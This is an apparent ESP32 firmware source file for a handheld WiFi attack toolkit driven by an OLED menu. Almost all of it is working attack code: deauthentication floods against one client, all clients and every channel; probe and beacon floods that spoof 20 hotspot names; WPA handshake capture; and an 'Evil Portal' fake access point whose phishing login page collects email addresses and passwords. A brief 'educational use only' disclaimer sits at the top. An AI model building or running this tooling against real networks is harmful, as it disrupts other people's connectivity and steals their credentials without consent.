/*
 * ============================================================================
 *  ESP32 Ultimate WiFi Security Toolkit - PRO EDITION (SHORTENED MENU)
 * ============================================================================
 *  Features:
 *    1. Network Scan + Client Detection
 *    2. Deauth Attack (single/broadcast) - high speed
 *    3. Probe Flood (random SSIDs)
 *    4. Beacon Flood (20+ fake APs)
 *    5. Handshake Sniffer (captures WPA handshakes) - shortened to "5. Sniffer"
 *    6. Deauth Reconnect Loop - shortened to "6. Deauth Loop"
 *    7. Channel Hopper (attacks all channels)
 *    8. Evil Portal (captive portal with credential capture)
 *  
 *  Hardware: ESP32 Dev Module + OLED 128x64 (I2C) + 2 buttons (GPIO12=UP, GPIO14=SELECT)
 *  
 *  ⚠️ EDUCATIONAL USE ONLY - Use only on networks you own or have permission to test! ⚠️
 * ============================================================================
 */

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <vector>

// ==================== OLED & Hardware ====================
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

#define BTN_UP    12    // GPIO12 - Navigate UP / STOP Attack
#define BTN_SEL   14    // GPIO14 - SELECT

// ==================== Data Structures ====================
struct WiFiNetwork {
  String ssid;
  uint8_t bssid[6];
  int32_t rssi;
  uint8_t channel;
};

struct StationInfo {
  uint8_t mac[6];
  int32_t rssi;
};

std::vector<WiFiNetwork> networks;
std::vector<StationInfo> stations;
int selectedNet = -1;
int selectedStation = -1;
bool scanning = false;
uint8_t targetBSSID[6];
uint8_t broadcastMac[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};

// ==================== Menu System ====================
enum State { MAIN, NET_LIST, STATION_LIST, ATTACK_MENU };
State state = MAIN;
int cursor = 0;
bool attackActive = false;

const char* mainItems[] = {"1. Scan Networks", "2. Select Network", "3. View Stations", "4. Launch Attacks"};
const int mainCount = 4;
// Shortened attack names to fit OLED display (no line wrapping)
const char* attackItems[] = {
  "1. Deauth Station", 
  "2. Deauth All", 
  "3. Probe Flood", 
  "4. Beacon Flood",
  "5. Sniffer",              // shortened from "Handshake Sniffer"
  "6. Deauth Loop",          // shortened from "Deauth Reconnect Loop"
  "7. Channel Hopper",
  "8. Evil Portal",
  "9. Stop Attack"
};
const int attackCount = 9;

// ==================== Global for Evil Portal ====================
DNSServer dnsServer;
WebServer webServer(80);
String capturedCredentials = "";
String capturedUserAgent = "";
unsigned long lastClientUpdate = 0;

// ==================== Global for Handshake Sniffer ====================
static unsigned long handshakeCount = 0;
static bool handshakeActive = false;

// ==================== Helper: Ensure AP Interface is Ready ====================
void ensureAPInterface() {
  static bool apStarted = false;
  if (!apStarted) {
    WiFi.softAP("ESP_Tool", NULL, 1, 1);
    apStarted = true;
    delay(100);
  }
  esp_wifi_set_promiscuous(false);
  delay(10);
  esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
  delay(10);
}

// ==================== Promiscuous Callback for Handshake Sniffer ====================
void handshakeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!handshakeActive) return;
  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
  uint8_t *payload = pkt->payload;
  int len = pkt->rx_ctrl.sig_len;
  if (len < 50) return;
  // Check for EAPOL frame (0x888E)
  if (payload[0] == 0x88 && payload[1] == 0x8E) {
    handshakeCount++;
    Serial.print("EAPOL frame captured! Length: ");
    Serial.println(len);
    Serial.print("Data: ");
    for (int i=0; i<len && i<100; i++) {
      Serial.printf("%02X", payload[i]);
    }
    Serial.println();
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Handshake #"); display.println(handshakeCount);
    display.display();
  }
}

// ==================== Attack Functions ====================

// Send a deauth packet (single)
void sendDeauth(uint8_t* bssid, uint8_t* dest, uint8_t channel) {
  ensureAPInterface();
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  uint8_t packet[26] = {0};
  packet[0] = 0xC0;
  packet[1] = 0x00;
  memcpy(&packet[4], dest, 6);
  memcpy(&packet[10], bssid, 6);
  memcpy(&packet[16], bssid, 6);
  packet[24] = 0x07;
  packet[25] = 0x00;
  esp_wifi_80211_tx(WIFI_IF_AP, packet, 26, false);
}

// Deauth attack (single or broadcast) with high speed
void attackDeauth(bool broadcast) {
  Serial.println("\n========== DEAUTHENTICATION ATTACK ==========");
  Serial.println("How it works: Sends deauth frames to disconnect clients.");
  Serial.println("Speed: MAXIMUM (no delay between packets)");
  Serial.println("============================================\n");
  
  WiFiNetwork& net = networks[selectedNet];
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== DEAUTH READY ===");
  display.print("Target: "); display.println(net.ssid.substring(0,12));
  if (!broadcast && selectedStation>=0) {
    display.print("Station: ");
    display.printf("%02X:%02X:%02X:%02X", stations[selectedStation].mac[2], stations[selectedStation].mac[3],
                   stations[selectedStation].mac[4], stations[selectedStation].mac[5]);
  } else {
    display.println("Mode: ALL STATIONS");
  }
  display.println("\nPress SELECT to start");
  display.println("Any button cancel");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_SEL)==LOW) break;
    if (digitalRead(BTN_UP)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(BTN_SEL)==LOW) delay(50);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("DEAUTH RUNNING");
  display.println("Press ANY button");
  display.println("to STOP");
  display.display();
  
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  unsigned long count = 0;
  attackActive = true;
  
  while (attackActive) {
    if (digitalRead(BTN_UP)==LOW || digitalRead(BTN_SEL)==LOW) { attackActive = false; break; }
    if (broadcast)
      sendDeauth(net.bssid, broadcastMac, net.channel);
    else
      sendDeauth(net.bssid, stations[selectedStation].mac, net.channel);
    count++;
    if (count % 500 == 0) {
      display.fillRect(0,40,128,24,SSD1306_BLACK);
      display.setCursor(0,40);
      display.print("Packets: "); display.println(count);
      display.display();
    }
    // No delay for maximum speed
  }
  esp_wifi_set_promiscuous(false);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Deauth stopped.");
  display.print("Packets: "); display.println(count);
  display.display();
  delay(2000);
}

// Deauth Reconnect Loop: continuously deauths to prevent stable connection
void attackDeauthReconnectLoop() {
  attackDeauth(true);
}

// Probe Flood with random SSIDs
void attackProbeFlood() {
  Serial.println("\n========== PROBE REQUEST FLOOD ==========");
  Serial.println("Sends probe requests with random SSIDs and MACs.");
  Serial.println("Clutters airwaves, may cause slowdowns.");
  Serial.println("========================================\n");
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== PROBE FLOOD ===");
  display.println("Press SELECT start");
  display.println("Any button cancel");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_SEL)==LOW) break;
    if (digitalRead(BTN_UP)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(BTN_SEL)==LOW) delay(50);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("PROBE FLOOD");
  display.println("Press any to stop");
  display.display();
  
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  unsigned long count = 0;
  attackActive = true;
  
  while (attackActive) {
    if (digitalRead(BTN_UP)==LOW || digitalRead(BTN_SEL)==LOW) { attackActive = false; break; }
    for (int ch=1; ch<=11; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      uint8_t probe[28] = {0};
      probe[0] = 0x40;
      probe[1] = 0x00;
      memset(&probe[4], 0xFF, 6);
      for (int j=10; j<16; j++) probe[j] = random(256);
      probe[24] = 0x00;
      probe[25] = 0x00;
      esp_wifi_80211_tx(WIFI_IF_AP, probe, 28, false);
      count++;
      if (count % 200 == 0) {
        display.fillRect(0,40,128,24,SSD1306_BLACK);
        display.setCursor(0,40);
        display.print("Packets: "); display.println(count);
        display.display();
      }
      delay(1);
    }
  }
  esp_wifi_set_promiscuous(false);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Probe Flood stopped");
  display.print("Packets: "); display.println(count);
  display.display();
  delay(2000);
}

// Beacon Flood (20 fake APs)
void attackBeaconFlood() {
  Serial.println("\n========== BEACON FLOOD (FAKE APs) ==========");
  Serial.println("Broadcasts 20 fake open Wi-Fi networks.");
  Serial.println("=============================================\n");
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== BEACON FLOOD ===");
  display.println("20 fake APs");
  display.println("Press SELECT start");
  display.println("Any button cancel");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_SEL)==LOW) break;
    if (digitalRead(BTN_UP)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(BTN_SEL)==LOW) delay(50);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("BEACON FLOOD");
  display.println("Broadcasting 20 APs");
  display.println("Press any to stop");
  display.display();
  
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  const char* fakeSSIDs[] = {
    "FreeWiFi","Starbucks","Airport_Free","Public_Net","Guest_WiFi",
    "Cafe_Net","Library","Hotel_WiFi","Mall_Access","Hotspot",
    "Verizon_WiFi","AT&T_WiFi","Xfinity","Google_Fiber","Spectrum",
    "Cox_WiFi","Optimum","Suddenlink","Mediacom","RCN"
  };
  int numSSIDs = 20;
  unsigned long count = 0;
  attackActive = true;
  
  while (attackActive) {
    if (digitalRead(BTN_UP)==LOW || digitalRead(BTN_SEL)==LOW) { attackActive = false; break; }
    for (int ch=1; ch<=11; ch++) {
      esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
      for (int i=0; i<numSSIDs; i++) {
        uint8_t beacon[109] = {0};
        beacon[0] = 0x80;
        beacon[1] = 0x00;
        memset(&beacon[4], 0xFF, 6);
        for (int j=10; j<16; j++) beacon[j] = random(256);
        memcpy(&beacon[16], &beacon[10], 6);
        beacon[36] = 0x00;
        beacon[37] = strlen(fakeSSIDs[i]);
        memcpy(&beacon[38], fakeSSIDs[i], strlen(fakeSSIDs[i]));
        beacon[106] = 0x03;
        beacon[107] = 0x01;
        beacon[108] = ch;
        esp_wifi_80211_tx(WIFI_IF_AP, beacon, 109, false);
        count++;
        if (!attackActive) break;
        delay(5);
      }
      if (!attackActive) break;
    }
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Packets: "); display.println(count);
    display.display();
  }
  esp_wifi_set_promiscuous(false);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Beacon Flood stopped");
  display.print("Packets: "); display.println(count);
  display.display();
  delay(2000);
}

// Handshake Sniffer: Captures WPA handshakes (saves to Serial)
void attackHandshakeSniffer() {
  Serial.println("\n========== HANDSHAKE SNIFFER ==========");
  Serial.println("Captures WPA handshakes from target AP.");
  Serial.println("To capture: Wait for a client to reconnect while deauth attack is running.");
  Serial.println("Handshake data will be printed to Serial as hex.");
  Serial.println("=======================================\n");
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== SNIFFER ===");
  display.print("Target: "); display.println(networks[selectedNet].ssid.substring(0,12));
  display.println("Press SELECT start");
  display.println("Any button cancel");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_SEL)==LOW) break;
    if (digitalRead(BTN_UP)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(BTN_SEL)==LOW) delay(50);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("SNIFFING...");
  display.println("Send deauth to force");
  display.println("reconnection.");
  display.println("Press any to stop");
  display.display();
  
  ensureAPInterface();
  handshakeCount = 0;
  handshakeActive = true;
  attackActive = true;
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(handshakeSnifferCallback);
  esp_wifi_set_channel(networks[selectedNet].channel, WIFI_SECOND_CHAN_NONE);
  
  while (attackActive) {
    if (digitalRead(BTN_UP)==LOW || digitalRead(BTN_SEL)==LOW) { attackActive = false; break; }
    delay(100);
  }
  
  handshakeActive = false;
  esp_wifi_set_promiscuous(false);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Sniffer stopped");
  display.print("EAPOL packets: "); display.println(handshakeCount);
  display.display();
  delay(2000);
}

// Channel Hopper: Rapidly changes channels while sending deauth packets
void attackChannelHopper() {
  Serial.println("\n========== CHANNEL HOPPER ==========");
  Serial.println("Rapidly switches channels while sending deauth broadcasts.");
  Serial.println("Disrupts all networks in range.");
  Serial.println("===================================\n");
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== CHANNEL HOPPER ===");
  display.println("Attacks all channels");
  display.println("Press SELECT start");
  display.println("Any button cancel");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_SEL)==LOW) break;
    if (digitalRead(BTN_UP)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(BTN_SEL)==LOW) delay(50);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("CHANNEL HOPPER");
  display.println("Switching channels");
  display.println("Press any to stop");
  display.display();
  
  ensureAPInterface();
  esp_wifi_set_promiscuous(true);
  attackActive = true;
  unsigned long count = 0;
  uint8_t channel = 1;
  
  while (attackActive) {
    if (digitalRead(BTN_UP)==LOW || digitalRead(BTN_SEL)==LOW) { attackActive = false; break; }
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i=0; i<10; i++) {  // send 10 deauth packets per channel
      sendDeauth(broadcastMac, broadcastMac, channel);
      count++;
    }
    channel++;
    if (channel > 11) channel = 1;
    display.fillRect(0,40,128,24,SSD1306_BLACK);
    display.setCursor(0,40);
    display.print("Packets: "); display.println(count);
    display.display();
    delay(10);
  }
  esp_wifi_set_promiscuous(false);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Channel Hopper stopped");
  display.print("Packets: "); display.println(count);
  display.display();
  delay(2000);
}

// Evil Portal (Captive Portal) - uses global webServer and dnsServer
void startEvilPortal() {
  Serial.println("\n========== EVIL PORTAL ==========");
  Serial.println("Creates fake AP 'FreeWiFi' and captures credentials.");
  Serial.println("Live client count & MACs shown on OLED.");
  Serial.println("================================\n");
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== EVIL PORTAL ===");
  display.println("AP: FreeWiFi");
  display.println("Press SELECT to start");
  display.println("Any button cancel");
  display.display();
  
  while (true) {
    if (digitalRead(BTN_SEL)==LOW) break;
    if (digitalRead(BTN_UP)==LOW) return;
    delay(50);
  }
  delay(300);
  while (digitalRead(BTN_SEL)==LOW) delay(50);
  
  attackActive = false;
  delay(100);
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Starting Portal...");
  display.display();
  
  // Stop any existing web server
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  delay(100);
  
  // Start soft AP
  WiFi.softAP("FreeWiFi", NULL, 6, 0);
  delay(100);
  dnsServer.start(53, "*", WiFi.softAPIP());
  
  // Setup web server routes
  webServer.on("/", []() {
    webServer.send(200, "text/html", "<!DOCTYPE html><html><head><title>WiFi Login</title><meta name='viewport' content='width=device-width'><style>body{font-family:sans-serif;text-align:center;padding:30px;}input{padding:10px;margin:5px;width:200px;}</style></head><body><h2>WiFi Login</h2><form action='/get' method='get'><input type='text' name='email' placeholder='Email'><br><input type='password' name='password' placeholder='Password'><br><button type='submit'>Login</button></form></body></html>");
  });
  
  webServer.on("/get", []() {
    String email = webServer.arg("email");
    String password = webServer.arg("password");
    capturedCredentials = "Email: " + email + " | Password: " + password;
    capturedUserAgent = webServer.header("User-Agent");
    Serial.printf("========== CREDENTIALS CAPTURED ==========\n");
    Serial.println(capturedCredentials);
    Serial.print("User-Agent: "); Serial.println(capturedUserAgent);
    Serial.println("==========================================\n");
    display.clearDisplay();
    display.setCursor(0,0);
    display.println("CREDENTIALS CAPTURED!");
    display.println(email.substring(0,10)); display.print(" / ");
    display.println(password.substring(0,10));
    display.display();
    webServer.send(200, "text/html", "<h2>Login Successful! Redirecting...</h2><script>setTimeout(function(){window.location.href='http://www.google.com';},3000);</script>");
  });
  
  webServer.onNotFound([]() {
    webServer.sendHeader("Location", "http://192.168.4.1/", true);
    webServer.send(302, "text/plain", "");
  });
  
  webServer.begin();
  
  attackActive = true;
  lastClientUpdate = 0;
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("EVIL PORTAL ACTIVE");
  display.println("AP: FreeWiFi");
  display.println("IP: 192.168.4.1");
  display.println("Press ANY button");
  display.println("to STOP");
  display.display();
  
  while (attackActive) {
    dnsServer.processNextRequest();
    webServer.handleClient();
    if (millis() - lastClientUpdate > 2000) {
      lastClientUpdate = millis();
      wifi_sta_list_t sta_list;
      esp_wifi_ap_get_sta_list(&sta_list);
      int num = sta_list.num;
      display.fillRect(0,48,128,16,SSD1306_BLACK);
      display.setCursor(0,48);
      display.print("Clients: "); display.print(num);
      if (num>0) {
        display.print(" MAC:");
        display.printf("%02X:%02X:%02X", sta_list.sta[0].mac[3], sta_list.sta[0].mac[4], sta_list.sta[0].mac[5]);
      }
      display.display();
    }
    if (digitalRead(BTN_UP)==LOW || digitalRead(BTN_SEL)==LOW) {
      attackActive = false;
      break;
    }
    delay(10);
  }
  
  webServer.stop();
  dnsServer.stop();
  WiFi.softAPdisconnect(true);
  
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Portal stopped");
  if (capturedCredentials.length()>0) display.println("Credentials saved");
  else display.println("No credentials");
  display.display();
  delay(2000);
}

// ==================== Scanning & Selection ====================
void scanNetworks() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("Scanning...");
  display.display();
  networks.clear();
  int n = WiFi.scanNetworks();
  if (n==0) {
    display.println("No networks");
    display.display();
    delay(1500);
    return;
  }
  for (int i=0;i<n;i++) {
    WiFiNetwork net;
    net.ssid = WiFi.SSID(i);
    net.rssi = WiFi.RSSI(i);
    net.channel = WiFi.channel(i);
    memcpy(net.bssid, WiFi.BSSID(i), 6);
    networks.push_back(net);
  }
}

void selectNetwork(int idx) {
  if (idx<0 || idx>=(int)networks.size()) return;
  selectedNet = idx;
  WiFiNetwork& net = networks[idx];
  display.clearDisplay();
  display.setCursor(0,0);
  display.print("Selected: "); display.println(net.ssid.substring(0,12));
  display.println("Scanning stations...");
  display.display();
  
  stations.clear();
  scanning = true;
  memcpy(targetBSSID, net.bssid, 6);
  
  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb([](void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!scanning) return;
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
    uint8_t *payload = pkt->payload;
    if (pkt->rx_ctrl.sig_len < 24) return;
    uint8_t *addr1 = payload+4, *addr2 = payload+10;
    bool toAP = (memcmp(addr1, targetBSSID,6)==0);
    bool fromAP = (memcmp(addr2, targetBSSID,6)==0);
    if (!toAP && !fromAP) return;
    uint8_t* station = toAP ? addr2 : addr1;
    if (station[0]&0x01) return;
    if (memcmp(station, targetBSSID,6)==0) return;
    for (auto &s : stations) if (memcmp(s.mac, station,6)==0) return;
    StationInfo st;
    memcpy(st.mac, station,6);
    st.rssi = pkt->rx_ctrl.rssi;
    stations.push_back(st);
  });
  esp_wifi_set_channel(net.channel, WIFI_SECOND_CHAN_NONE);
  delay(5000);
  esp_wifi_set_promiscuous(false);
  scanning = false;
}

// ==================== Display Functions ====================
void drawMain() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== MAIN MENU ===");
  for (int i=0;i<mainCount;i++) {
    if (i==cursor) display.print("> ");
    else display.print("  ");
    display.println(mainItems[i]);
  }
  display.display();
}

void drawNetworks() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== NETWORKS ===");
  int start = max(0, cursor-2);
  int end = min((int)networks.size(), start+4);
  for (int i=start;i<end;i++) {
    if (i==cursor) display.print("> ");
    else display.print("  ");
    String name = networks[i].ssid.length()>12 ? networks[i].ssid.substring(0,12) : networks[i].ssid;
    display.print(name); display.print(" Ch"); display.println(networks[i].channel);
  }
  display.display();
}

void drawStations() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== STATIONS ===");
  int start = max(0, cursor-2);
  int end = min((int)stations.size(), start+4);
  for (int i=start;i<end;i++) {
    if (i==cursor) display.print("> ");
    else display.print("  ");
    display.printf("%02X:%02X:%02X:%02X", stations[i].mac[2], stations[i].mac[3], stations[i].mac[4], stations[i].mac[5]);
    display.print(" "); display.print(stations[i].rssi); display.println(" dBm");
  }
  display.display();
}

void drawAttackMenu() {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println("=== ATTACK MENU ===");
  int start = max(0, cursor-3);
  int end = min(attackCount, start+5);
  for (int i=start;i<end;i++) {
    if (i==cursor) display.print("> ");
    else display.print("  ");
    display.println(attackItems[i]);
  }
  display.display();
}

void errorMsg(const char* msg) {
  display.clearDisplay();
  display.setCursor(0,0);
  display.println(msg);
  display.display();
  delay(1500);
}

// ==================== Setup ====================
void setup() {
  Serial.begin(115200);
  if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
    Serial.println("OLED not found!");
    while(1);
  }
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_SEL, INPUT_PULLUP);
  
  WiFi.mode(WIFI_MODE_APSTA);
  ensureAPInterface();  // Start dummy AP
  esp_wifi_set_ps(WIFI_PS_NONE);
  
  display.println("ESP32 Ultimate");
  display.println("Security Pro");
  display.println("Ready!");
  display.display();
  delay(1500);
}

// ==================== Main Loop ====================
void loop() {
  static unsigned long lastDebounce = 0;
  static bool lastUp=HIGH, lastSel=HIGH;
  bool upNow = digitalRead(BTN_UP);
  bool selNow = digitalRead(BTN_SEL);
  
  if (upNow==LOW && lastUp==HIGH && millis()-lastDebounce>200) {
    lastDebounce = millis();
    switch(state) {
      case MAIN: cursor = (cursor+1) % mainCount; break;
      case NET_LIST: if (networks.size()>0) cursor = (cursor+1) % networks.size(); break;
      case STATION_LIST: if (stations.size()>0) cursor = (cursor+1) % stations.size(); break;
      case ATTACK_MENU: cursor = (cursor+1) % attackCount; break;
    }
  }
  
  if (selNow==LOW && lastSel==HIGH && millis()-lastDebounce>200) {
    lastDebounce = millis();
    switch(state) {
      case MAIN:
        if (cursor==0) { scanNetworks(); state=NET_LIST; cursor=0; }
        else if (cursor==1) { if(networks.size()>0) state=NET_LIST; else errorMsg("Scan first"); }
        else if (cursor==2) { if(selectedNet>=0 && stations.size()>0) state=STATION_LIST; else errorMsg("No stations/net"); }
        else if (cursor==3) { if(selectedNet>=0) state=ATTACK_MENU; else errorMsg("Select network"); }
        break;
      case NET_LIST:
        if (cursor < (int)networks.size()) {
          selectNetwork(cursor);
          state = MAIN;
          cursor = 0;
        }
        break;
      case STATION_LIST:
        if (cursor < (int)stations.size()) {
          selectedStation = cursor;
          display.clearDisplay();
          display.setCursor(0,0);
          display.println("Station selected:");
          display.printf("MAC: %02X:%02X:%02X:%02X:%02X:%02X\n", 
            stations[cursor].mac[0],stations[cursor].mac[1],stations[cursor].mac[2],
            stations[cursor].mac[3],stations[cursor].mac[4],stations[cursor].mac[5]);
          display.printf("RSSI: %d dBm", stations[cursor].rssi);
          display.display();
          delay(1500);
          state = ATTACK_MENU;
          cursor = 0;
        }
        break;
      case ATTACK_MENU:
        switch(cursor) {
          case 0: if(selectedStation>=0) attackDeauth(false); else errorMsg("No station"); break;
          case 1: attackDeauth(true); break;
          case 2: attackProbeFlood(); break;
          case 3: attackBeaconFlood(); break;
          case 4: attackHandshakeSniffer(); break;
          case 5: attackDeauthReconnectLoop(); break;
          case 6: attackChannelHopper(); break;
          case 7: startEvilPortal(); break;
          case 8: attackActive = false; errorMsg("Attack stopped"); break;
        }
        state = MAIN;
        cursor = 0;
        break;
    }
  }
  
  lastUp = upNow; lastSel = selNow;
  
  switch(state) {
    case MAIN: drawMain(); break;
    case NET_LIST: drawNetworks(); break;
    case STATION_LIST: drawStations(); break;
    case ATTACK_MENU: drawAttackMenu(); break;
  }
  delay(50);
}
